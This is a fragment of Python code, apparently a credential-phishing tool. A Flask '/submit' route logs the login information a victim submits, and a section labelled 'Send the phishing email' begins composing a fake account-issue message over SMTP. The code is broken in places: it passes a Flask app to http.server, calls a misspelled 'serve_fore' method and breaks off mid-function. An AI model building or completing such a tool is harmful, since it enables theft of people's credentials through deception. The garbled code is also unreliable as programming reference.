    return html_template

@app.route('/submit', methods=['POST'])
def submit():
    print("User submitted: " + str(request.form))
    return "Thank you for your login information!"

def run_server():
    server = http.server.HTTPServer(('localhost', 8000), app)
    server.serve_fore()
    server.handle_request()

if __name__ == "__main__":
    # Start the server
    server_thread = threading.Thread(target=run_server)
    server_thread.start()

    # Send the phishing email
    with smtplib.SMTP('localhost', 587) as connection:
        from_email = 'your.email@example.com'
        to_email = 'test@example.com'
        subject = 'Important: Your Account Issue'
